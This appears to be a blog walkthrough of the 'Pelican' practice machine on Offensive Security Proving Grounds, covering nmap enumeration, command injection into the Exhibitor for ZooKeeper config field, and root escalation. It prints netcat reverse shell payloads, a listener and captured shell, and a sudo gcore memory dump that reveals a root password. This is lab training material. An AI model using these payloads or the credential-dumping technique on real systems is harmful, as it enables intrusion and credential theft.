---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# enumeration

Executing a `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- -sV 192.168.126.98
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-12 04:14 EST
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 85.71% done; ETC: 04:15 (0:00:02 remaining)
Nmap scan report for 192.168.126.98
Host is up (0.025s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp  open  ipp         CUPS 2.2
2222/tcp open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8080/tcp open  http        Jetty 1.0
8081/tcp open  http        nginx 1.14.2
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.75 seconds
```

## port 139,445 (`smb`)
> No shares available.
{: .prompt-danger }

## port 631 (`cups`)
> No vulnerability found for `cups 2.2`
{: .prompt-danger }

## port 8080 (`jetty`)
Responds with a `404` message.

## port 8081 (`nginx`)
`Exhibitor for ZooKeeperv 1.0` is installed on this web server.

---

# exploitation
## looking for an exploit
```bash
$ searchsploit exhibitor                                                           
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Exhibitor Web UI 1.7.1 - Remote Code Execution                                                                                                                                                            | java/webapps/48654.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
`Exhibitor Web UI 1.7.1 - Remote Code Execution` seems promising.  
Relevant steps to exploit the vulnerability via a browser.  
  
`java/webapps/48654.txt` excerpt
```
The steps to exploit it from a web browser:

    Open the Exhibitor Web UI and click on the Config tab, then flip the Editing switch to ON

    In the “java.env script” field, enter any command surrounded by $() or ``, for example, for a simple reverse shell:

    $(/bin/nc -e /bin/sh 10.0.0.64 4444 &)
    Click Commit > All At Once > OK
    The command may take up to a minute to execute.
```

## exploit
### start listener on attacker machine
```bash
$ nc -lvp 8081                                    
listening on [any] 8081 ...
```

### trigger rce
As described in the exploit above set the `java.env` field to the value `$(/bin/nc -e /bin/sh 192.168.49.126 8081 &)`.  
Now commit and wait.

### catch connection from targer
```bash
$ nc -lvp 8081                                    
listening on [any] 8081 ...
192.168.126.98: inverse host lookup failed: Unknown host
connect to [192.168.49.126] from (UNKNOWN) [192.168.126.98] 51396
whoami
charles
```

> We got a shell!
{: .prompt-info }

---

# post exploitation
## get first flag
```bash
cd /home 
ls
charles
cd charles
ls
local.txt
cat local.txt
2******************************b
```

## privilege escalation

Check which commands we can execute with `sudo` as user `charles`.
```bash
charles@pelican:~$ sudo -l
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```
`gcore` can be used with super user permissions.
Checking [gtfobins](https://gtfobins.github.io/gtfobins/gcore/#sudo) reveals that `gcore` allows to dump processes.  
The next step is to dump a `root` process which might contain passwords.  

> Unfortunately no user is logged in via `ssh` (this would allow catching the submitted password)
{: .prompt-danger }

Lets have a look which proccesses are running and are executed as `root`.

```bash
charles@pelican:~$ ps -ef | grep root
ps -ef | grep root
root         1     0  0 04:08 ?        00:00:00 /sbin/init
root         2     0  0 04:08 ?        00:00:00 [kthreadd]
root         3     2  0 04:08 ?        00:00:00 [rcu_gp]
...
root       495     1  0 04:08 ?        00:00:00 /usr/bin/password-store
...
```

`/usr/bin/password-store` looks interesting.
{: .prompt-info }

Dump process with `gcore`
```bash
charles@pelican:~$ sudo gcore 495
sudo gcore 495
0x00007f50a9fce6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffccf6689b0, remaining=remaining@entry=0x7ffccf6689b0) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile core.495
[Inferior 1 (process 495) detached]
charles@pelican:~$ strings core.495
strings core.495
CORE
password-store
/usr/bin/password-store 
...
001 Password: root:
ClogKingpinInning731
...
```
> We found `root` credentials: `root:ClogKingpinInning731`!
{: .prompt-info }

```bash
charles@pelican:~$ su root
su root
Password: ClogKingpinInning731

root@pelican:/home/charles#
```

> `root` access!
{: .prompt-info }

## second flag
```bash
root@pelican:/home/charles# cd /root
cd /root
root@pelican:~# ls
ls
Desktop    Downloads  Pictures   Public     Videos
Documents  Music      proof.txt  Templates
root@pelican:~# cat proof.txt
cat proof.txt
f******************************8
```

Pwned! <@:-)
